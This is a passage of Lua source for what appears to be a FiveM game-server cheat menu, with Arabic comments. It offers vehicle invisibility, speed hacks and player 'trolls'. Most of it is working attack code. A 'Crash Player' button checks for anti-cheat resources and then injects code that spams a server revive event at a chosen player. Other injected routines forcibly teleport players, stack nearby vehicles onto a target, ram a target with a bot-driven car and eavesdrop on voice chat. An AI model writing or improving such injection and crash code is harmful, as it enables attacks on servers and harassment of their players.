        if not vehicleInvisibilityLoop then
            vehicleInvisibilityLoop = true
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                MachoMenuNotification("Vehicle Invisible", "Activated - Alpha: " .. vehicleInvisibilityAlpha)
            else
                MachoMenuNotification("Vehicle Invisible", "You need to be in a vehicle!")
                vehicleInvisibilityLoop = false
                return
            end
            
            CreateThread(function()
                while vehicleInvisibilityLoop do
                    local playerPed = PlayerPedId()
                    
                    if IsPedInAnyVehicle(playerPed, false) then
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        
                        -- للآخرين: إخفاء كامل
                        SetEntityVisible(vehicle, false, false)
                        
                        -- للكلاينت: جعل السيارة مرئية محلياً
                        SetEntityLocallyVisible(vehicle)
                        
                        -- تطبيق مستوى الشفافية
                        if vehicleInvisibilityAlpha == 0 then
                            SetEntityAlpha(vehicle, 0, false)
                        else
                            SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
                        end
                    else
                        -- إذا خرج من السيارة، أوقف الاختفاء
                        vehicleInvisibilityLoop = false
                        MachoMenuNotification("Vehicle Invisible", "Deactivated - Left vehicle")
                    end
                    
                    Wait(0)
                end
                
                -- إرجاع السيارة للحالة الطبيعية عند الإلغاء
                local playerPed = PlayerPedId()
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    SetEntityVisible(vehicle, true, false)
                    SetEntityAlpha(vehicle, 255, false)
                end
            end)
        else
            vehicleInvisibilityLoop = false
            MachoMenuNotification("Vehicle Invisible", "Deactivated")
            
            -- إرجاع السيارة للحالة الطبيعية
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, 255, false)
            end
        end
    end
end)
local shiftBoostSpeed = 50.0 -- السرعة الافتراضية للـ Shift Boost
local shiftBoostActive = false
local shiftBoostLoop = false

-- سلايدر واحد لتحديد سرعة الـ Shift Boost
local ShiftBoostSlider = MachoMenuSlider(VehicleCheck, "Shift Boost Speed", 100, 100, 150, "km/h", 0, function(Value)
    shiftBoostSpeed = tonumber(Value)
end)

-- Checkbox لتفعيل/إلغاء تفعيل الـ Shift Boost
MachoMenuCheckbox(VehicleCheck, "Shift Boost",
    function()
        shiftBoostActive = true
        shiftBoostLoop = true
        MachoMenuNotification("Shift Boost", "Activated - Hold Shift while driving")
        
        Citizen.CreateThread(function()
            while shiftBoostLoop do
                -- التحقق من أن اللاعب في مركبة
                if shiftBoostActive and IsPedInAnyVehicle(PlayerPedId(), true) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    
                    -- التحقق من أن اللاعب هو السائق
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        -- التحقق من الضغط على Shift (مفتاح 21)
                        if IsControlPressed(1, 21) then -- Left Shift
                            -- الحصول على السرعة الحالية
                            local currentSpeed = GetEntitySpeed(vehicle) * 3.6 -- تحويل من m/s إلى km/h
                            local targetSpeed
                            
                            -- منطق السرعة الذكي
                            if currentSpeed > shiftBoostSpeed then
                                -- إذا كانت السيارة أسرع من قيمة السلايدر، قلل السرعة تدريجياً
                                targetSpeed = currentSpeed - (currentSpeed * 0.02) -- تقليل تدريجي بنسبة 2%
                            else
                                -- إذا كانت السيارة أبطأ من قيمة السلايدر، زد السرعة بنسبة 5%
                                targetSpeed = currentSpeed + (shiftBoostSpeed * 0.05)
                                
                                -- تأكد من عدم تجاوز الحد الأقصى
                                if targetSpeed > shiftBoostSpeed * 1.2 then
                                    targetSpeed = shiftBoostSpeed * 1.2
                                end
                            end
                            
                            -- تطبيق السرعة المحسوبة (تحويل مرة أخرى إلى m/s)
                           SetVehicleForwardSpeed(vehicle,targetSpeed / 3.6)
                        end
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        shiftBoostActive = false
        shiftBoostLoop = false
        MachoMenuNotification("Smart Shift Boost", "Deactivated")
    end
)
local groundMagnetActive = false
local groundMagnetLoop = false

-- Checkbox لتفعيل/إلغاء تفعيل المغناطيس الأرضي
MachoMenuCheckbox(VehicleCheck, "Light Ground Magnet",
    function()
        groundMagnetActive = true
        groundMagnetLoop = true
        MachoMenuNotification("Light Ground Magnet", "Activated - Gentle ground attraction")
        
        Citizen.CreateThread(function()
            while groundMagnetLoop do
                -- التحقق من أن اللاعب في مركبة
                if groundMagnetActive and IsPedInAnyVehicle(PlayerPedId(), true) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    
                    -- التحقق من أن اللاعب هو السائق
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        
                        local velocity = GetEntityVelocity(vehicle)
                        local vehicleHeight = GetEntityHeightAboveGround(vehicle)
                        
                        -- جاذبية خفيفة جداً فقط لو كانت في الهواء
                        if vehicleHeight > 1.0 then
                            local downwardForce = velocity.z - 2.0 -- جذب خفيف جداً
                            
                            -- تطبيق الجاذبية الخفيفة
                            SetEntityVelocity(vehicle, velocity.x, velocity.y, downwardForce)
                        end
                        
                    end
                end
                Citizen.Wait(100) -- تحديث أبطأ
            end
        end)
    end,
    function()
        groundMagnetActive = false
        groundMagnetLoop = false
        MachoMenuNotification("Light Ground Magnet", "Deactivated")
    end
)




MachoMenuText(MenuWindow,"Players & Vehicles")
local MainTab = MachoMenuAddTab(MenuWindow, "Player list")
local sdSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
local sdSERVERCFWEachSectionWidth = (sdSERVERCFWSectionChildWidth - 20) / 2

local PlayerSection = MachoMenuGroup(MainTab, "Player Trolls", 
    TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
    MenuSize.x - 5, MenuSize.y - 5)

local InfoSection = MachoMenuGroup(MainTab, "Main & Info", 
    TabsBarWidth + 5, 5 + MachoPaneGap, 
    TabsBarWidth + sdSERVERCFWEachSectionWidth, MenuSize.y - 5)

local TextHandles = {}
for i = 1, 5 do
    TextHandles[i] = MachoMenuText(InfoSection, (i == 1 and "Name: ") or (i == 2 and "player ID: ") or (i == 3 and "Distance: ") or
        (i == 4 and "Driving: ") or (i == 5 and "Alive: ") .. "Waiting for a select")
end

local function generateRandomText(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local randomText = ""
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        randomText = randomText .. string.sub(chars, randIndex, randIndex)
    end
    return randomText
end

local function generateTransitionText(targetText, currentIndex)
    if currentIndex >= #targetText then
        return targetText
    end
    local partialText = string.sub(targetText, 1, currentIndex)
    local remainingLength = #targetText - currentIndex
    return partialText .. generateRandomText(remainingLength)
end

local function getPlayerInfo(player)
    if not player or not DoesEntityExist(GetPlayerPed(player)) then
        return nil
    end

    local ped = GetPlayerPed(player)
    local myPed = PlayerPedId()
    local info = {}

    info[1] = "Name: " .. (GetPlayerName(player) or "Unknown")
    info[2] = "Player ID: " .. (GetPlayerServerId(player) or "Unknown")

    local myCoords = GetEntityCoords(myPed)
    local playerCoords = GetEntityCoords(ped)
    local distance = #(myCoords - playerCoords)
    info[3] = string.format("Distance: %.0f m", distance)

    info[4] = "Driving: " .. (IsPedInAnyVehicle(ped, false) and "Yes" or "No")
    info[5] = "Alive: " .. (IsPedDeadOrDying(ped, true) and "No" or "Yes")

    return info
end

Citizen.CreateThread(function()
    local currentPlayer = nil
    local transitionIndices = {0, 0, 0, 0, 0}
    local isTransitioning = false
    local targetTexts = {"", "", "", "", ""}

    while true do
        local player = MachoMenuGetSelectedPlayer()

        if player and type(player) == "number" and NetworkIsPlayerActive(player) and DoesEntityExist(GetPlayerPed(player)) then
            if player ~= currentPlayer then
                currentPlayer = player
                local info = getPlayerInfo(player)
                if info then
                    for i = 1, 5 do
                        targetTexts[i] = info[i]
                        transitionIndices[i] = 0
                    end
                    isTransitioning = true
                end
            end

            if isTransitioning then
                local allDone = true
                for i = 1, 5 do
                    if transitionIndices[i] <= #targetTexts[i] then
                        MachoMenuSetText(TextHandles[i], generateTransitionText(targetTexts[i], transitionIndices[i]))
                        transitionIndices[i] = transitionIndices[i] + 1
                        allDone = false
                    end
                end
                if allDone then
                    isTransitioning = false
                    for i = 1, 5 do
                        MachoMenuSetText(TextHandles[i], targetTexts[i])
                    end
                end
                Citizen.Wait(25)
            else
                local info = getPlayerInfo(player)
                if info then
                    for i = 1, 5 do
                        MachoMenuSetText(TextHandles[i], info[i])
                    end
                end
                Citizen.Wait(25)
            end
        else
            currentPlayer = nil
            isTransitioning = false
            for i = 1, 5 do
                local prefix = (i == 1 and "Name: ") or (i == 2 and "Player ID: ") or (i == 3 and "Distance: ") or
                               (i == 4 and "Driving: ") or (i == 5 and "alive: ")
                MachoMenuSetText(TextHandles[i], prefix .. "Waiting for a select")
            end
            Citizen.Wait(25)
        end
    end
end)
local isSpectating = false
local spectateCamera = nil
local spectatingTarget = nil
local camRot = vector3(0.0, 0.0, 0.0)
local camDistance = 5.0

MachoMenuCheckbox(InfoSection, "Spectate Player",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 then
            return MachoMenuNotification("Error", "No player selected")
        end

        local targetPed = GetPlayerPed(selectedPlayer)
        if not DoesEntityExist(targetPed) then
            return MachoMenuNotification("Error", "Player not found")
        end

        isSpectating = true
        spectatingTarget = selectedPlayer
        SetPlayerControl(PlayerId(), false, 0)

        -- إعداد الكاميرا
        spectateCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        SetCamActive(spectateCamera, true)
        RenderScriptCams(true, true, 0, true, true)

        Citizen.CreateThread(function()
            while isSpectating and DoesEntityExist(GetPlayerPed(spectatingTarget)) do
                local ped = GetPlayerPed(spectatingTarget)
                local targetCoords = GetEntityCoords(ped)

                -- قراءة حركة الماوس
                local mouseX = GetDisabledControlNormal(0, 1)
                local mouseY = GetDisabledControlNormal(0, 2)

                camRot = vector3(
                    math.max(-89.0, math.min(89.0, camRot.x - mouseY * 5.0)),
                    0.0,
                    camRot.z - mouseX * 5.0
                )

                -- حساب اتجاه الكاميرا
                local direction = RotationToDirection(camRot)
                local camCoords = targetCoords - direction * camDistance + vector3(0.0, 0.0, 1.0)

                SetCamCoord(spectateCamera, camCoords.x, camCoords.y, camCoords.z)
                PointCamAtEntity(spectateCamera, ped, 0.0, 0.0, 0.0, true)
                SetCamRot(spectateCamera, camRot.x, camRot.y, camRot.z, 2)

                -- تعطيل التحكم الكامل
                DisableAllControlActions(0)
                EnableControlAction(0, 1, true) -- ماوس X
                EnableControlAction(0, 2, true) -- ماوس Y

                Citizen.Wait(0)
            end
        end)

        NetworkSetTalkerProximity(9999.0) -- نسمع الصوت من بعيد
        NetworkClearVoiceChannel()

        MachoMenuNotification("Spectate", "Spectating ID: " .. GetPlayerServerId(selectedPlayer))
    end,

    function()
        isSpectating = false
        spectatingTarget = nil
        SetPlayerControl(PlayerId(), true, 0)

        if spectateCamera then
            RenderScriptCams(false, false, 0, true, true)
            DestroyCam(spectateCamera, false)
            spectateCamera = nil
        end

        NetworkSetTalkerProximity(15.0)

        MachoMenuNotification("Spectate", "Stopped spectating")
    end
)
MachoMenuCheckbox(InfoSection, "Teleport Player to Me",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 then
            return MachoMenuNotification("Error", "No player selected")
        end

        local targetPed = GetPlayerPed(selectedPlayer)
        if not DoesEntityExist(targetPed) then
            return MachoMenuNotification("Error", "Player not found")
        end

        isAutoTeleporting = true
        teleportingTarget = selectedPlayer

        Citizen.CreateThread(function()
            while isAutoTeleporting and DoesEntityExist(GetPlayerPed(teleportingTarget)) do
                local targetPed = GetPlayerPed(teleportingTarget)
                local playerPed = PlayerPedId()
                
                if DoesEntityExist(targetPed) and DoesEntityExist(playerPed) then
                    local myCoords = GetEntityCoords(playerPed)

                    -- طلب التحكم في الكيان قبل محاولة النقل
                    local timeout = 0
                    while not NetworkHasControlOfEntity(targetPed) and timeout < 50 do
                        NetworkRequestControlOfEntity(targetPed)
                        Citizen.Wait(100)
                        timeout = timeout + 1
                    end

                    -- فقط حاول تنقله لو حصلت التحكم
                    if NetworkHasControlOfEntity(targetPed) then
                        SetEntityCoords(targetPed, myCoords.x + 1.0, myCoords.y + 1.0, myCoords.z, false, false, false, true)
                    else
                        MachoMenuNotification("Error", "Couldn't get control of player")
                    end
                end

                Citizen.Wait(1000)
            end
        end)

        MachoMenuNotification("Auto Teleport", "Started auto teleporting ID: " .. GetPlayerServerId(selectedPlayer))
    end,

    function()
        isAutoTeleporting = false
        teleportingTarget = nil

        MachoMenuNotification("Auto Teleport", "Stopped auto teleporting")
    end
)


function RotationToDirection(rot)
    local radX = math.rad(rot.x)
    local radZ = math.rad(rot.z)
    return vector3(
        -math.sin(radZ) * math.abs(math.cos(radX)),
        math.cos(radZ) * math.abs(math.cos(radX)),
        math.sin(radX)
    )
end

MachoMenuButton(InfoSection, "Crash Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            -- More notifications to give a searching impression
            Citizen.Wait(500)
            MachoMenuNotification("Search", "Checking for Crasher...")
            Citizen.Wait(500)
            MachoMenuNotification("Search", "Analyzing...")
            Citizen.Wait(500)
            
            -- Main loading notification
            MachoMenuNotification("Loading", "loading Crasher...")

            local targetServerId = GetPlayerServerId(selectedPlayer)
            
            -- Wait for a moment to give the "loading" message some time to display
            Citizen.Wait(1000)

            -- Check if any of the specified resources exist
            local isProtectedServer = false
            if GetResourceState("EC_AC") == "started" then
                isProtectedServer = true
            end

            if not isProtectedServer and GetResourceState("vrp") == "started" then
                isProtectedServer = true
            end

            if not isProtectedServer then
                local allResources = GetNumResources()
                for i = 0, allResources - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if string.sub(resourceName, 1, 4) == "esx_" then
                        isProtectedServer = true
                        break
                    end
                end
            end

            if isProtectedServer then
                -- If any of the resources are found, show the "cannot revive" notification
                MachoMenuNotification("Error", "you can't use the Crasher in this server")
            else
                -- If none of the specified resources are found, proceed with the revive spam
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local targetServerId = ]] .. targetServerId .. [[
                        local count = 0
                        while count < 120 do
                            TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                            Citizen.Wait(1) -- Delay of 1 millisecond
                            count = count + 1
                        end
                    end)
                ]])
                MachoMenuNotification("Success", "Sent Crash to Player ID: " .. targetServerId)

            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(InfoSection, "Goto Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetCoords = GetEntityCoords(targetPed)
            local playerPed = PlayerPedId()
            SetEntityCoords(playerPed, targetCoords.x + 1.0, targetCoords.y + 1.0, targetCoords.z, false, false, false, true)
            MachoMenuNotification("Players", "Teleported to Player ID: " .. GetPlayerServerId(selectedPlayer))
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)



MachoMenuButton(InfoSection, "Copy Outfit", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    -- Clone the outfit
    local playerPed = PlayerPedId()
    
    -- Get all clothing components from target player
    for i = 0, 11 do
        local componentId = GetPedDrawableVariation(targetPed, i)
        local textureId = GetPedTextureVariation(targetPed, i)
        SetPedComponentVariation(playerPed, i, componentId, textureId, 0)
    end
    
    -- Get all props from target player
    for i = 0, 7 do
        local propId = GetPedPropIndex(targetPed, i)
        local propTexture = GetPedPropTextureIndex(targetPed, i)
        if propId ~= -1 then
            SetPedPropIndex(playerPed, i, propId, propTexture, true)
        else
            ClearPedProp(playerPed, i)
        end
    end
    
    local targetName = GetPlayerName(selectedPlayer)
    MachoMenuNotification("Clone Outfit", "Cloned outfit from " .. targetName)
end)


MachoMenuButton(InfoSection, "Into Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            if vehicle and vehicle ~= 0 then
                local playerPed = PlayerPedId()
                local freeSeat = -1
                for seat = 0, GetVehicleMaxNumberOfPassengers(vehicle) do
                    if IsVehicleSeatFree(vehicle, seat) then
                        freeSeat = seat
                        break
                    end
                end
                if freeSeat ~= -1 then
                    TaskWarpPedIntoVehicle(playerPed, vehicle, freeSeat)
                    MachoMenuNotification("Players", "Entered Player " .. GetPlayerServerId(selectedPlayer) .. "'s vehicle")
                else
                    MachoMenuNotification("Error", "No free seats in vehicle")
                end
            else
                MachoMenuNotification("Error", "Player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)

MachoMenuButton(InfoSection, "Ride Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    -- Check if already attached
    if IsEntityAttached(PlayerPedId()) then
        -- Stop piggyback
        ClearPedSecondaryTask(PlayerPedId())
        DetachEntity(PlayerPedId(), true, false)
        MachoMenuNotification("Piggyback", "Stopped piggyback ride")
    else
        -- Start piggyback
        local playerPed = GetPlayerPed(selectedPlayer)
        
        if not DoesEntityExist(playerPed) then
            MachoMenuNotification("Error", "Target player not found!")
            return
        end
        
        -- Load animation
        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                Citizen.Wait(0)
            end        
        end
        
        -- Attach to player with corrected positioning (rotated LEFT and lower)
        AttachEntityToEntity(PlayerPedId(), playerPed, 0, 0.0, -0.25, 0.45, 0.0, 0.0, 25.0, false, false, false, false, 2, false)
        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
        
        local targetName = GetPlayerName(selectedPlayer)
        MachoMenuNotification("Piggyback", "Piggyback riding on " .. targetName)
    end
end)
MachoMenuButton(InfoSection, "Attach Vehicles Spam it!", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if not selectedPlayer or selectedPlayer == -1 then
        MachoMenuNotification("Error", "No player selected")
        return
    end

    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)

    -- Injecting the client-side code into vrp resource
    MachoInjectResource("any", [[
        Citizen.CreateThread(function()
            local selectedPlayer = ]] .. selectedPlayer .. [[
            local targetPed = GetPlayerPed(selectedPlayer)
            
            -- Exit if the target ped does not exist
            if not DoesEntityExist(targetPed) then 
                return 
            end

            local playerPed = PlayerPedId()
            local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
            local originalHeading = ]] .. originalHeading .. [[
            
            local vehicles = GetGamePool("CVehicle")
            local attachedVehicles = {}
            local failedToAttach = {}
            local targetCoords = GetEntityCoords(targetPed)
            local maxAttachDistance = 1000.0 -- Define a maximum distance for attaching vehicles. Adjust as needed.


            -- Loop through all vehicles in the game pool
            for _, vehicle in pairs(vehicles) do
                -- Check if the vehicle entity exists and is within the defined distance
                if DoesEntityExist(vehicle) and Vdist(GetEntityCoords(vehicle), targetCoords) < maxAttachDistance then
                    local netID = NetworkGetNetworkIdFromEntity(vehicle)
                    local attempts = 0
                    local maxAttempts = 60 -- Increased attempts for network control
                    local waitTime = 5   -- Increased wait time per attempt (in milliseconds)

                    -- Attempt to gain network control of the vehicle
                    while not NetworkHasControlOfEntity(vehicle) and attempts < maxAttempts do
                        NetworkRequestControlOfEntity(vehicle)
                        Citizen.Wait(waitTime) -- Wait for a short period to allow network control to be granted
                        attempts = attempts + 1
                    end

                    -- If network control is successfully gained
                    if NetworkHasControlOfEntity(vehicle) then
                        SetNetworkIdCanMigrate(netID, true) -- Allow network migration
                        SetEntityAsMissionEntity(vehicle, true, true) -- Mark as mission entity to prevent despawn
                        SetVehicleHasBeenOwnedByPlayer(vehicle, true) -- Mark as owned by player

                        -- Attach the vehicle to the target ped
                        -- Parameters: entityToAttach, entityToAttachTo, boneIndex, xOffset, yOffset, zOffset, xRot, yRot, zRot, 
                        --             p_9, useZaxis, p_11, p_12, collision, isPed, vertexIndex, fixedRot
                        AttachEntityToEntity(
                            vehicle, targetPed, 0,
                            0.0, 0.0, 2.0 + (#attachedVehicles * 1.0), -- Stack vehicles vertically
                            0.0, 0.0, 0.0,
                            false, false, true, false, 2, true
                        )
                        table.insert(attachedVehicles, vehicle)
                    else
                        -- Log vehicles that failed to gain control and thus couldn't be attached
                        table.insert(failedToAttach, GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)))
                    end
                end
            end

            -- Display notification for failed attachments
            if #failedToAttach > 0 then
                local failedMsg = "Failed to attach " .. #failedToAttach .. " vehicles: " .. table.concat(failedToAttach, ", ") .. "."
                -- MachoMenuNotification("Warning", failedMsg) -- Uncomment if MachoMenuNotification is available in client-side context
            end

            -- Speed up player movement
            SetPedMoveRateOverride(playerPed, 10.0)

            -- Clear any existing tasks on the player ped before starting the sequence
            ClearPedTasksImmediately(playerPed)

            -- Rapidly enter and exit attached vehicles
            for i, vehicle in ipairs(attachedVehicles) do
                -- Ensure vehicle still exists before interacting
                if not DoesEntityExist(vehicle) then
                    goto continue_loop -- Skip to next iteration
                end

                ClearPedTasksImmediately(playerPed) -- Clear tasks before each new action

                -- Check if the driver's seat is free (-1 indicates driver's seat)
                if IsVehicleSeatFree(vehicle, -1) then
                    -- If the seat is empty, warp the ped directly into the vehicle
                    Citizen.Wait(100) -- Small delay after warping
                else
                    -- If the seat is occupied, use TaskEnterVehicle
                    TaskEnterVehicle(playerPed, vehicle, 1, -1, 100.0, 1, 0) -- Enter as driver, high speed, any seat

                    local taskEnterTimeout = GetGameTimer() + 3000 -- Increased timeout to 3 seconds for TaskEnterVehicle
                    while not IsPedInVehicle(playerPed, vehicle, false) and GetGameTimer() < taskEnterTimeout do
                        Citizen.Wait(10)
                    end

                    -- Fallback: If TaskEnterVehicle failed to complete within the timeout, force warp
                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        ClearPedTasksImmediately(playerPed) -- Clear tasks before fallback warp
                        Citizen.Wait(100) -- Small delay after fallback warp
                    end
                end
                
                -- Check if ped is actually in the vehicle before trying to leave
                if IsPedInVehicle(playerPed, vehicle, false) then
                    Citizen.Wait(100) -- Small delay after entering (or warping)
                    ClearPedTasksImmediately(playerPed) -- Clear tasks before leaving
                    TaskLeaveVehicle(playerPed, vehicle, 0) -- Exit vehicle
                    
                    local leaveTimeout = GetGameTimer() + 900 -- 0.9 seconds timeout for leaving
                    while IsPedInVehicle(playerPed, vehicle, false) and GetGameTimer() < leaveTimeout do
                        Citizen.Wait(10)
                    end
                    Citizen.Wait(100) -- Small delay after exiting
                else
                end

                ClearPedTasksImmediately(playerPed)
                -- Reset player position and heading
                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                SetEntityHeading(playerPed, originalHeading)
                
                Citizen.Wait(60) -- Quick transition before the next vehicle
                ::continue_loop:: -- Label for goto statement
            end

            -- Reset player movement speed to normal
            SetPedMoveRateOverride(playerPed, 1.0)
        end)
    ]])
    
    -- Notification for the user
    MachoMenuNotification("Injected", "Fast Enter injected for all nearby vehicles. Check console for details.")
end)

MachoMenuButton(PlayerSection, "Ram Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)
    
    -- إذا كان الشخص المختار في سيارة
    if targetVehicle ~= 0 then
        -- التحقق من أن السيارة فارغة من اللاعبين الحقيقيين
        local isVehicleEmpty = true
        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
        
        for seat = -1, maxSeats do
            local pedInSeat = GetPedInVehicleSeat(targetVehicle, seat)
            if pedInSeat ~= 0 then
                local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                if playerId ~= -1 and IsPlayerActive(playerId) then
                    isVehicleEmpty = false
                    break
                end
            end
        end
        
        if isVehicleEmpty then
            -- Fast warp for empty vehicle
            SetEntityVisible(playerPed, false, false)
            ClearPedTasksImmediately(playerPed)
            TaskWarpPedIntoVehicle(playerPed, targetVehicle, -1)
            ClearPedTasksImmediately(playerPed)
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
            SetEntityHeading(playerPed, originalHeading)
            SetEntityVisible(playerPed, true, false)
            
            -- Single VDM attack using MachoInjectResource
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                    local targetVehicle = ]] .. targetVehicle .. [[
                    
                    if DoesEntityExist(targetPed) and DoesEntityExist(targetVehicle) then
                        local targetPos = GetEntityCoords(targetPed)
                        local targetHeading = GetEntityHeading(targetPed)
                        local forwardVec = GetEntityForwardVector(targetPed)
                        local spawnPos = targetPos + forwardVec * 15.0
                        
                        NetworkRequestControlOfEntity(targetVehicle)
                        SetEntityAsMissionEntity(targetVehicle, true, true)
                        
                        -- إنشاء بوت للقيادة
                        local botModel = GetHashKey("mp_m_freemode_01")
                        RequestModel(botModel)
                        while not HasModelLoaded(botModel) do
                            Citizen.Wait(0)
                        end
                        
                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                        
                        SetEntityAsMissionEntity(botPed, false, false)
                        SetPedCanBeDraggedOut(botPed, false)
                        SetPedConfigFlag(botPed, 32, true)
                        SetPedFleeAttributes(botPed, 0, false)
                        SetPedCombatAttributes(botPed, 17, true)
                        SetPedSeeingRange(botPed, 0.0)
                        SetPedHearingRange(botPed, 0.0)
                        SetPedAlertness(botPed, 0)
                        SetPedKeepTask(botPed, true)
                        SetEntityCollision(botPed, false, false)
                        SetEntityVisible(botPed, true, false)
                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                        
                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                        
                        SetVehicleDoorsLocked(targetVehicle, 4)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetVehicleEnginePowerMultiplier(targetVehicle, 2.0)
                        ModifyVehicleTopSpeed(targetVehicle, 1.5)
                        
                        -- Position vehicle and attack ONCE
                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                        PlaceObjectOnGroundProperly(targetVehicle)
                        
                        SetVehicleForwardSpeed(targetVehicle, 35.0)
                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 40.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                        
                        -- Clean up after 5 seconds
                        Citizen.Wait(5000)
                        if DoesEntityExist(botPed) then
                            DeleteEntity(botPed)
                        end
                        SetModelAsNoLongerNeeded(botModel)
                    end
                end)
            ]])
            
            local targetName = GetPlayerName(selectedPlayer)
            MachoMenuNotification("VDM", "Single attack launched on " .. targetName)
            
        else
            MachoMenuNotification("Error", "Target vehicle is occupied by other players!")
        end
        
    -- إذا كان الشخص المختار ليس في سيارة - البحث عن سيارة فارغة
    else
        local targetPos = GetEntityCoords(targetPed)
        
        -- البحث عن أقرب سيارة فارغة
        local closestEmptyVehicle = nil
        local closestDistance = 999999.0
        
        for vehicle in EnumerateVehicles() do
            if DoesEntityExist(vehicle) then
                local vehiclePos = GetEntityCoords(vehicle)
                local distance = #(targetPos - vehiclePos)
                
                if distance < 100.0 then
                    local isVehicleEmpty = true
                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                    
                    for seat = -1, maxSeats do
                        local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                        if pedInSeat ~= 0 then
                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                            if playerId ~= -1 and IsPlayerActive(playerId) then
                                isVehicleEmpty = false
                                break
                            end
                        end
                    end
                    
                    if isVehicleEmpty and distance < closestDistance then
                        closestEmptyVehicle = vehicle
                        closestDistance = distance
                    end
                end
            end
        end
        
        if closestEmptyVehicle then
            -- Fast warp for empty vehicle
            SetEntityVisible(playerPed, false, false)
            ClearPedTasksImmediately(playerPed)
